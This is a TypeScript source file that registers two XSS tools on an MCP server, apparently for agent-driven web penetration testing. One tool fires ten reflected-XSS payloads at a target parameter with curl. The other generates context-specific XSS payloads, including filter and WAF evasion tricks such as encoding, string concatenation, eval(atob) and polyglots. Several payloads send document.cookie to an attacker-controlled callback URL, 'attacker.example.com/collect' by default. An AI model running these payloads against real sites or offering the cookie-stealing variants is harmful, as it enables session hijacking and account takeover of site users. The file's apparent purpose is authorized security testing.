/**
 * XSS testing tools.
 *
 * Wraps reflected/stored XSS vectors and filter bypass techniques.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "xss_reflected_test",
    "Test multiple reflected XSS vectors against a parameter. Sends 10 payloads (script tags, event handlers, SVG, attribute injection, case variation, template literals) and checks if they appear unescaped in the response. Returns results array with reflected/encoded/status per payload, and vulnerable_count. Side effects: Read-only GET requests. Sends 10 requests.",
    {
      url: z.string().describe("URL with reflectable parameter, e.g. https://target/search?q=test"),
      parameter: z.string().describe("Parameter name that reflects input, e.g. 'q'"),
    },
    async ({ url, parameter }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      const payloads = [
        "<script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        `" onfocus=alert(1) autofocus="`,
        "<img src=x onerror=alert`1`>",
        "<details open ontoggle=alert(1)>",
        "'-alert(1)-'",
        "javascript:alert(1)",
      ];

      // Unique canary to detect reflection
      const canary = "xR3f7kQ9";

      const results = [];
      for (const payload of payloads) {
        const fullPayload = `${canary}${payload}`;
        const res = await runCmd("curl", [
          "-sk",
          "-o", "-",
          "-w", "\n__STATUS__%{http_code}",
          `${baseUrl}?${parameter}=${fullPayload}`,
        ]);
        let body = res.stdout;
        const statusMarker = body.lastIndexOf("__STATUS__");
        let status = 0;
        if (statusMarker !== -1) {
          try {
            status = parseInt(body.slice(statusMarker + 10).trim(), 10);
          } catch {
            // leave status as 0
          }
          body = body.slice(0, statusMarker);
        }

        // Check for unescaped reflection
        const reflected = body.includes(payload);
        // Check if it was HTML-encoded
        const encoded =
          body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")) ||
          body.includes(payload.replace(/"/g, "&quot;"));

        results.push({
          payload,
          reflected_unescaped: reflected,
          reflected_encoded: encoded,
          status,
        });
      }

      const vulnerableCount = results.filter((r) => r.reflected_unescaped).length;
      const result = {
        results,
        vulnerable_count: vulnerableCount,
        hint:
          vulnerableCount > 0
            ? `${vulnerableCount} payload(s) reflected without encoding.`
            : "No unescaped reflections detected. Try DOM-based vectors or different parameters.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "xss_payload_generate",
    "Generate context-appropriate XSS payloads with optional filter evasion. Returns a list of payloads tailored to the injection context and filter bypass requirements. Returns context, filter_bypass, payloads array, notes. Side effects: None. Pure payload generation, no network requests.",
    {
      context: z
        .enum(["html_body", "html_attribute", "javascript", "url", "css"])
        .describe("Injection context: where the user input lands"),
      filter_bypass: z
        .enum(["none", "tag_filter", "keyword_filter", "waf", "aggressive"])
        .optional()
        .describe("Level of filter evasion needed"),
      callback_url: z
        .string()
        .optional()
        .describe("Attacker-controlled URL for data exfiltration payloads"),
    },
    async ({ context, filter_bypass = "none", callback_url }) => {
      let payloads: string[] = [];
      let notes = "";

      const cb = callback_url ?? "https://attacker.example.com/collect";

      if (context === "html_body") {
        if (filter_bypass === "none") {
          payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            `<script>document.location='${cb}?c='+document.cookie</script>`,
            `<script>fetch('${cb}?c='+document.cookie)</script>`,
          ];
        } else if (filter_bypass === "tag_filter") {
          payloads = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<body onload=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
          ];
          notes = "If <script> is filtered, event handlers on other tags bypass it.";
        } else if (filter_bypass === "keyword_filter") {
          payloads = [
            "<img src=x onerror=alert`1`>",
            "<img src=x onerror=\\u0061lert(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<img src=x onerror=window['al'+'ert'](1)>",
            "<img src=x onerror=self['al'+'ert'](1)>",
          ];
          notes = "Bypasses keyword filters on 'alert', 'script', etc.";
        } else if (filter_bypass === "waf" || filter_bypass === "aggressive") {
          payloads = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
          ];
          notes = "Polyglot and encoding-based payloads for WAF evasion.";
        }
      } else if (context === "html_attribute") {
        payloads = [
          `" onfocus=alert(1) autofocus="`,
          `' onfocus=alert(1) autofocus='`,
          `" onmouseover=alert(1) "`,
          `"><script>alert(1)</script>`,
          `' autofocus onfocus=alert(1)//`,
          `" onfocus=fetch('${cb}?c='+document.cookie) autofocus="`,
        ];
        notes = "Break out of attribute context, inject event handler.";
      } else if (context === "javascript") {
        payloads = [
          "'-alert(1)-'",
          "';alert(1)//",
          '";alert(1)//',
          "\\';alert(1)//",
          "</script><script>alert(1)</script>",
          "${alert(1)}",
          `';fetch('${cb}?c='+document.cookie)//`,
        ];
        notes = "Break out of JS string context.";
      } else if (context === "url") {
        payloads = [
          "javascript:alert(1)",
          "data:text/html,<script>alert(1)</script>",
          `javascript:void(document.location='${cb}?c='+document.cookie)`,
        ];
        notes = "URL context — javascript: and data: schemes.";
      } else if (context === "css") {
        payloads = [
          "expression(alert(1))",
          "url(javascript:alert(1))",
          "};alert(1);//",
          `url('${cb}?c='+document.cookie)`,
        ];
        notes = "CSS injection context — limited browser support for JS in CSS.";
      }

      const result = {
        context,
        filter_bypass,
        payloads,
        count: payloads.length,
        notes,
        exfiltration_url: callback_url ? cb : "Set callback_url for data theft payloads.",
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
